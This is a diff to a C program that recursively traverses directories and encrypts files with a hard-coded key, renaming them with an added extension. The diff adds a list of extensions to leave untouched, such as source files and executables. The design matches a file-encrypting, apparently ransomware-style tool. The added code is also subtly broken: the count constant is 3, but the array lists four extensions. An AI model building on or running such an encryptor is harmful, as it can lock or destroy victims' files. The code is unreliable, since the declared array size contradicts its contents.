@@ -40,6 +40,15 @@
 #define KEY_HEX             "0123456789ABCDEF0123"  /* 20 hex digits (80-bit key) */
 #define TEMP_SUFFIX_MIN     2           /* random suffix length in bytes (min) */
 #define TEMP_SUFFIX_MAX     24          /* random suffix length in bytes (max) */
+
+/* Add here the extensions you never want to encrypt */
+#define NUM_EXCLUDED_EXTS     3
+static const char *EXCLUDED_EXTS[NUM_EXCLUDED_EXTS] = {
+    ".c",
+    ".h",
+    ".exe",
+    ".elf"
+};
 /*———————————————————*/
 
 typedef struct file_node {
@@ -251,6 +260,13 @@ static void traverse_recursive(const char *path) {
 static int process_file(const char *filepath) {
     size_t len = strlen(filepath);
     size_t extlen = strlen(EXTENSION);
+  
+    /* skip files with excluded extensions */
+    for (int i = 0; i < NUM_EXCLUDED_EXTS; i++) {
+        size_t elen = strlen(EXCLUDED_EXTS[i]);
+        if (len > elen && strcmp(filepath + len - elen, EXCLUDED_EXTS[i]) == 0)
+            return 0;
+    }
     /* skip already-encrypted */
     if (len > extlen &&
         strcmp(filepath + len - extlen, EXTENSION) == 0)
